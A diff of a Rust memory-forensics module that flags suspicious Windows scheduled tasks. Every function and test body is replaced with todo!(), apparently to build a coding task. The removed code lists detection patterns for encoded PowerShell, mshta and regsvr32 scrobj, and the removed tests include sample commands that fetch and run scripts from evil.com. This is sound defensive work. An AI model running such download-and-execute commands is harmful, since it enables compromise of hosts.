@@ -44,45 +44,8 @@ pub struct ScheduledTaskInfo {
 /// - Task in unusual paths (not under \Microsoft\Windows)
 /// - Action references temp directories or user-writable locations
 pub fn classify_scheduled_task(name: &str, action: &str) -> bool {
-    if name.is_empty() || action.is_empty() {
-        return false;
+        todo!()
     }
-
-    let action_lower = action.to_ascii_lowercase();
-
-    // Encoded/obfuscated commands
-    if action_lower.contains("-enc") || action_lower.contains("-encodedcommand") {
-        return true;
-    }
-
-    // Commands from suspicious locations
-    if action_lower.contains("\\temp\\")
-        || action_lower.contains("\\tmp\\")
-        || action_lower.contains("\\appdata\\")
-        || action_lower.contains("\\downloads\\")
-        || action_lower.contains("\\public\\")
-    {
-        return true;
-    }
-
-    // Known suspicious patterns
-    if action_lower.contains("mshta") || action_lower.contains("regsvr32 /s /n /u /i:") {
-        return true;
-    }
-
-    // Task in non-standard path with script execution
-    let name_lower = name.to_ascii_lowercase();
-    if !name_lower.starts_with("\\microsoft\\") && !name_lower.starts_with("microsoft\\") {
-        if action_lower.contains("powershell")
-            || action_lower.contains("wscript")
-            || action_lower.contains("cscript")
-        {
-            return true;
-        }
-    }
-
-    false
-}
 
 /// Enumerate scheduled tasks from the Task Scheduler service memory.
 ///
@@ -92,125 +55,8 @@ pub fn classify_scheduled_task(name: &str, action: &str) -> bool {
 pub fn walk_scheduled_tasks<P: PhysicalMemoryProvider>(
     reader: &ObjectReader<P>,
 ) -> crate::Result<Vec<ScheduledTaskInfo>> {
-    // Try UbpmTaskEnumerator first, then TaskSchedulerTaskList.
-    let list_head = match reader.symbols().symbol_address("UbpmTaskEnumerator") {
-        Some(addr) => addr,
-        None => match reader.symbols().symbol_address("TaskSchedulerTaskList") {
-            Some(addr) => addr,
-            None => return Ok(Vec::new()),
-        },
-    };
-
-    // Resolve _TASK_ENTRY field offsets.
-    let task_list_entry_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "TaskListEntry")
-        .unwrap_or(0x00);
-
-    let name_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "Name")
-        .unwrap_or(0x10);
-
-    let path_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "Path")
-        .unwrap_or(0x20);
-
-    let action_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "Action")
-        .unwrap_or(0x30);
-
-    let author_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "Author")
-        .unwrap_or(0x40);
-
-    let enabled_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "Enabled")
-        .unwrap_or(0x50);
-
-    let last_run_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "LastRunTime")
-        .unwrap_or(0x58);
-
-    let next_run_off = reader
-        .symbols()
-        .field_offset("_TASK_ENTRY", "NextRunTime")
-        .unwrap_or(0x60);
-
-    // Read head Flink.
-    let first = match reader.read_bytes(list_head, 8) {
-        Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
-        _ => return Ok(Vec::new()),
-    };
-
-    if first == 0 || first == list_head {
-        return Ok(Vec::new());
+        todo!()
     }
-
-    let mut tasks = Vec::new();
-    let mut current = first;
-    let mut seen = std::collections::HashSet::new();
-
-    while current != list_head && current != 0 && tasks.len() < MAX_TASKS {
-        if !seen.insert(current) {
-            break; // Cycle detection.
-        }
-
-        // current points to TaskListEntry within _TASK_ENTRY.
-        let task_addr = current.wrapping_sub(task_list_entry_off);
-
-        // Read UNICODE_STRING fields.
-        let name = read_unicode_string(reader, task_addr + name_off).unwrap_or_default();
-        let path = read_unicode_string(reader, task_addr + path_off).unwrap_or_default();
-        let action = read_unicode_string(reader, task_addr + action_off).unwrap_or_default();
-        let author = read_unicode_string(reader, task_addr + author_off).unwrap_or_default();
-
-        // Read enabled flag (u32, nonzero = enabled).
-        let enabled = match reader.read_bytes(task_addr + enabled_off, 4) {
-            Ok(bytes) if bytes.len() == 4 => {
-                u32::from_le_bytes(bytes[..4].try_into().unwrap()) != 0
-            }
-            _ => false,
-        };
-
-        // Read timestamps (FILETIME u64).
-        let last_run_time = match reader.read_bytes(task_addr + last_run_off, 8) {
-            Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
-            _ => 0,
-        };
-
-        let next_run_time = match reader.read_bytes(task_addr + next_run_off, 8) {
-            Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
-            _ => 0,
-        };
-
-        let is_suspicious = classify_scheduled_task(&name, &action);
-
-        tasks.push(ScheduledTaskInfo {
-            name,
-            path,
-            action,
-            author,
-            enabled,
-            last_run_time,
-            next_run_time,
-            is_suspicious,
-        });
-
-        // Follow Flink to next entry.
-        current = match reader.read_bytes(current, 8) {
-            Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
-            _ => break,
-        };
-    }
-
-    Ok(tasks)
-}
 
 #[cfg(test)]
 mod tests {
@@ -224,260 +70,135 @@ mod tests {
     /// No scheduled task symbol → empty Vec.
     #[test]
     fn walk_scheduled_tasks_no_symbol() {
-        let isf = IsfBuilder::new()
-            .add_struct("_TASK_ENTRY", 0x80)
-            .build_json();
-        let resolver = IsfResolver::from_value(&isf).unwrap();
-        let (cr3, mem) = PageTableBuilder::new().build();
-        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
-        let reader = ObjectReader::new(vas, Box::new(resolver));
-
-        let result = walk_scheduled_tasks(&reader).unwrap();
-        assert!(result.is_empty());
+        todo!()
     }
 
     /// Benign Microsoft tasks are not suspicious.
     #[test]
     fn classify_benign_microsoft_task() {
-        assert!(!classify_scheduled_task(
-            "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
-            "C:\\Windows\\System32\\usoclient.exe StartScan"
-        ));
+        todo!()
     }
 
     /// Tasks with encoded PowerShell commands are suspicious.
     #[test]
     fn classify_suspicious_encoded_command() {
-        assert!(classify_scheduled_task(
-            "\\CustomTask",
-            "powershell.exe -enc ZQBjAGgAbwAgACIAaABlAGwAbABvACIA"
-        ));
+        todo!()
     }
 
     /// Tasks executing from temp directories are suspicious.
     #[test]
     fn classify_suspicious_temp_path() {
-        assert!(classify_scheduled_task(
-            "\\Microsoft\\Windows\\MyTask",
-            "C:\\Users\\admin\\AppData\\Local\\Temp\\malware.exe"
-        ));
+        todo!()
     }
 
     /// Non-Microsoft tasks running PowerShell are suspicious.
     #[test]
     fn classify_suspicious_nonstandard_powershell() {
-        assert!(classify_scheduled_task(
-            "\\UpdateChecker",
-            "powershell.exe -File C:\\Scripts\\update.ps1"
-        ));
+        todo!()
     }
 
     /// Empty name or action is not suspicious.
     #[test]
     fn classify_empty_not_suspicious() {
-        assert!(!classify_scheduled_task("", ""));
-        assert!(!classify_scheduled_task("\\Task", ""));
-        assert!(!classify_scheduled_task("", "cmd.exe"));
+        todo!()
     }
 
     /// -encodedcommand flag is suspicious.
     #[test]
     fn classify_suspicious_encodedcommand_flag() {
-        assert!(classify_scheduled_task(
-            "\\BadTask",
-            "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
-        ));
+        todo!()
     }
 
     /// tmp directory in action is suspicious.
     #[test]
     fn classify_suspicious_tmp_path() {
-        assert!(classify_scheduled_task(
-            "\\Task",
-            "C:\\Windows\\Temp\\tmp\\evil.exe"
-        ));
+        todo!()
     }
 
     /// Downloads directory in action is suspicious.
     #[test]
     fn classify_suspicious_downloads_path() {
-        assert!(classify_scheduled_task(
-            "\\Task",
-            "C:\\Users\\User\\Downloads\\backdoor.exe"
-        ));
+        todo!()
     }
 
     /// Public directory in action is suspicious.
     #[test]
     fn classify_suspicious_public_path() {
-        assert!(classify_scheduled_task(
-            "\\Task",
-            "C:\\Users\\Public\\update.exe"
-        ));
+        todo!()
     }
 
     /// mshta in action is suspicious regardless of task path.
     #[test]
     fn classify_suspicious_mshta() {
-        assert!(classify_scheduled_task(
-            "\\Microsoft\\Windows\\Legit",
-            "mshta.exe http://evil.com/payload.hta"
-        ));
+        todo!()
     }
 
     /// regsvr32 /s /n /u /i: pattern is suspicious.
     #[test]
     fn classify_suspicious_regsvr32() {
-        assert!(classify_scheduled_task(
-            "\\Task",
-            "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
-        ));
+        todo!()
     }
 
     /// wscript on non-Microsoft task is suspicious.
     #[test]
     fn classify_suspicious_wscript_nonstandard() {
-        assert!(classify_scheduled_task(
-            "\\EvilTask",
-            "wscript.exe C:\\evil\\payload.vbs"
-        ));
+        todo!()
     }
 
     /// cscript on non-Microsoft task is suspicious.
     #[test]
     fn classify_suspicious_cscript_nonstandard() {
-        assert!(classify_scheduled_task(
-            "\\UpdateTask",
-            "cscript.exe //nologo C:\\scripts\\evil.vbs"
-        ));
+        todo!()
     }
 
     /// powershell on Microsoft-prefixed task (without suspicious flags) is benign.
     #[test]
     fn classify_microsoft_powershell_benign() {
-        assert!(!classify_scheduled_task(
-            "\\Microsoft\\Windows\\PowerShell",
-            "powershell.exe -NonInteractive -Command Get-Item C:\\Windows"
-        ));
+        todo!()
     }
 
     /// microsoft\\ prefix (no leading backslash) is also treated as standard.
     #[test]
     fn classify_microsoft_no_leading_slash_benign() {
-        assert!(!classify_scheduled_task(
-            "Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
-            "C:\\Windows\\System32\\usoclient.exe StartScan"
-        ));
+        todo!()
     }
 
     /// ScheduledTaskInfo serializes correctly.
     #[test]
     fn scheduled_task_info_serializes() {
-        let info = ScheduledTaskInfo {
-            name: "\\EvilTask".to_string(),
-            path: "\\EvilTask".to_string(),
-            action: "powershell.exe -enc AAAA".to_string(),
-            author: "SYSTEM".to_string(),
-            enabled: true,
-            last_run_time: 0x01D8_ABCD_1234_5678,
-            next_run_time: 0x01D8_DCBA_8765_4321,
-            is_suspicious: true,
-        };
-
-        let json = serde_json::to_string(&info).unwrap();
-        assert!(json.contains("\"name\":\"\\\\EvilTask\""));
-        assert!(json.contains("\"enabled\":true"));
-        assert!(json.contains("\"is_suspicious\":true"));
-        assert!(json.contains("\"author\":\"SYSTEM\""));
+        todo!()
     }
 
     /// TaskSchedulerTaskList fallback symbol used when UbpmTaskEnumerator absent.
     /// List head points to itself → empty list → empty result.
     #[test]
     fn walk_scheduled_tasks_fallback_symbol_empty_list() {
-        let list_vaddr: u64 = 0xFFFF_8000_0070_0000;
-        let list_paddr: u64 = 0x0070_0000;
-
-        // Flink at offset 0 points back to list_vaddr → empty list.
-        let ptb = PageTableBuilder::new()
-            .map_4k(list_vaddr, list_paddr, flags::WRITABLE)
-            .write_phys(list_paddr, &list_vaddr.to_le_bytes());
-
-        let isf = IsfBuilder::new()
-            .add_struct("_TASK_ENTRY", 0x80)
-            .add_symbol("TaskSchedulerTaskList", list_vaddr)
-            .build_json();
-        let resolver = IsfResolver::from_value(&isf).unwrap();
-        let (cr3, mem) = ptb.build();
-        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
-        let reader = ObjectReader::new(vas, Box::new(resolver));
-
-        let result = walk_scheduled_tasks(&reader).unwrap();
-        assert!(
-            result.is_empty(),
-            "list head == first should yield no tasks"
-        );
+        todo!()
     }
 
     /// UbpmTaskEnumerator present, list head Flink == 0 → empty result.
     #[test]
     fn walk_scheduled_tasks_ubpm_symbol_first_is_null() {
-        let list_vaddr: u64 = 0xFFFF_8000_0071_0000;
-        let list_paddr: u64 = 0x0071_0000;
-
-        // Flink = 0 (null).
-        let ptb = PageTableBuilder::new()
-            .map_4k(list_vaddr, list_paddr, flags::WRITABLE)
-            .write_phys(list_paddr, &0u64.to_le_bytes());
-
-        let isf = IsfBuilder::new()
-            .add_struct("_TASK_ENTRY", 0x80)
-            .add_symbol("UbpmTaskEnumerator", list_vaddr)
-            .build_json();
-        let resolver = IsfResolver::from_value(&isf).unwrap();
-        let (cr3, mem) = ptb.build();
-        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
-        let reader = ObjectReader::new(vas, Box::new(resolver));
-
-        let result = walk_scheduled_tasks(&reader).unwrap();
-        assert!(result.is_empty(), "null Flink should yield no tasks");
+        todo!()
     }
 
     /// UbpmTaskEnumerator present, read of list head fails (unmapped) → empty result.
     #[test]
     fn walk_scheduled_tasks_ubpm_symbol_unreadable_head() {
-        let list_vaddr: u64 = 0xFFFF_8000_DEAD_BEEF;
-
-        let isf = IsfBuilder::new()
-            .add_struct("_TASK_ENTRY", 0x80)
-            .add_symbol("UbpmTaskEnumerator", list_vaddr)
-            .build_json();
-        let resolver = IsfResolver::from_value(&isf).unwrap();
-        let (cr3, mem) = PageTableBuilder::new().build();
-        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
-        let reader = ObjectReader::new(vas, Box::new(resolver));
-
-        let result = walk_scheduled_tasks(&reader).unwrap();
-        assert!(result.is_empty(), "unreadable list head should yield no tasks");
+        todo!()
     }
 
     /// classify_scheduled_task: appdata path is suspicious.
     #[test]
     fn classify_suspicious_appdata_path() {
-        assert!(classify_scheduled_task(
-            "\\Task",
-            "C:\\Users\\admin\\AppData\\Roaming\\evil.exe"
-        ));
+        todo!()
     }
 
     /// Non-Microsoft task name without powershell/wscript/cscript but with a
     /// benign exe is not suspicious.
     #[test]
     fn classify_nonstandard_task_benign_action_not_suspicious() {
-        assert!(!classify_scheduled_task(
-            "\\MyCompany\\UpdateChecker",
-            "C:\\Program Files\\MyApp\\updater.exe --check"
-        ));
+        todo!()
     }
 
     // ── walk body coverage ──────────────────────────────────────────
@@ -488,99 +209,13 @@ mod tests {
     /// strings are empty and the task is pushed with empty fields.
     #[test]
     fn walk_scheduled_tasks_one_entry_in_loop() {
-        // Memory layout:
-        //   list_head  = 0xFFFF_8000_0080_0000: Flink → entry (0xFFFF_8000_0081_0000)
-        //   entry_ptr  = 0xFFFF_8000_0081_0000: Flink → list_head (terminates loop)
-        //     At task_addr = entry_ptr - task_list_entry_off:
-        //       All UNICODE_STRING fields zero → empty strings
-        //       Enabled at +0x50 = 0 → false
-        //       LastRunTime at +0x58 = 0x1234
-        //       NextRunTime at +0x60 = 0x5678
-        //
-        // Since task_list_entry_off defaults to 0x00, task_addr = entry_ptr.
-        let list_vaddr: u64 = 0xFFFF_8000_0080_0000;
-        let list_paddr: u64 = 0x0080_0000;
-        let entry_vaddr: u64 = 0xFFFF_8000_0081_0000;
-        let entry_paddr: u64 = 0x0081_0000;
-
-        // List head page: [Flink=entry_vaddr, ...]
-        let mut head_page = vec![0u8; 0x1000];
-        head_page[0..8].copy_from_slice(&entry_vaddr.to_le_bytes());
-
-        // Entry page: [Flink=list_vaddr (loop terminator), ...task fields]
-        let mut entry_page = vec![0u8; 0x1000];
-        // Flink at offset 0 (task_list_entry_off = 0)
-        entry_page[0..8].copy_from_slice(&list_vaddr.to_le_bytes());
-        // LastRunTime at +0x58 = 0x1234
-        entry_page[0x58..0x60].copy_from_slice(&0x1234u64.to_le_bytes());
-        // NextRunTime at +0x60 = 0x5678
-        entry_page[0x60..0x68].copy_from_slice(&0x5678u64.to_le_bytes());
-
-        let isf = IsfBuilder::new()
-            .add_struct("_TASK_ENTRY", 0x80)
-            .add_symbol("UbpmTaskEnumerator", list_vaddr)
-            .build_json();
-        let resolver = IsfResolver::from_value(&isf).unwrap();
-        let (cr3, mem) = PageTableBuilder::new()
-            .map_4k(list_vaddr, list_paddr, flags::WRITABLE)
-            .write_phys(list_paddr, &head_page)
-            .map_4k(entry_vaddr, entry_paddr, flags::WRITABLE)
-            .write_phys(entry_paddr, &entry_page)
-            .build();
-        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
-        let reader = ObjectReader::new(vas, Box::new(resolver));
-
-        let result = walk_scheduled_tasks(&reader).unwrap();
-        assert_eq!(result.len(), 1, "exactly one task entry should be produced");
-        let task = &result[0];
-        assert_eq!(task.last_run_time, 0x1234);
-        assert_eq!(task.next_run_time, 0x5678);
-        assert!(!task.enabled);
-        assert!(!task.is_suspicious);
+        todo!()
     }
 
     /// Walk body: two entries, second entry has Flink = list_head → loop stops.
     /// Tests the Flink-following code path with two iterations.
     #[test]
     fn walk_scheduled_tasks_two_entries_in_loop() {
-        let list_vaddr: u64  = 0xFFFF_8000_0082_0000;
-        let entry1_vaddr: u64 = 0xFFFF_8000_0083_0000;
-        let entry2_vaddr: u64 = 0xFFFF_8000_0084_0000;
-
-        let list_paddr: u64   = 0x0082_0000;
-        let entry1_paddr: u64 = 0x0083_0000;
-        let entry2_paddr: u64 = 0x0084_0000;
-
-        let mut head_page = vec![0u8; 0x1000];
-        head_page[0..8].copy_from_slice(&entry1_vaddr.to_le_bytes());
-
-        let mut e1_page = vec![0u8; 0x1000];
-        e1_page[0..8].copy_from_slice(&entry2_vaddr.to_le_bytes());
-        // Enabled at +0x50 = 1
-        e1_page[0x50..0x54].copy_from_slice(&1u32.to_le_bytes());
-
-        let mut e2_page = vec![0u8; 0x1000];
-        e2_page[0..8].copy_from_slice(&list_vaddr.to_le_bytes()); // back to head
-
-        let isf = IsfBuilder::new()
-            .add_struct("_TASK_ENTRY", 0x80)
-            .add_symbol("UbpmTaskEnumerator", list_vaddr)
-            .build_json();
-        let resolver = IsfResolver::from_value(&isf).unwrap();
-        let (cr3, mem) = PageTableBuilder::new()
-            .map_4k(list_vaddr,   list_paddr,   flags::WRITABLE)
-            .write_phys(list_paddr, &head_page)
-            .map_4k(entry1_vaddr, entry1_paddr, flags::WRITABLE)
-            .write_phys(entry1_paddr, &e1_page)
-            .map_4k(entry2_vaddr, entry2_paddr, flags::WRITABLE)
-            .write_phys(entry2_paddr, &e2_page)
-            .build();
-        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
-        let reader = ObjectReader::new(vas, Box::new(resolver));
-
-        let result = walk_scheduled_tasks(&reader).unwrap();
-        assert_eq!(result.len(), 2, "two entries should be produced");
-        assert!(result[0].enabled, "first entry should be enabled");
-        assert!(!result[1].enabled, "second entry should not be enabled");
+        todo!()
     }
 }
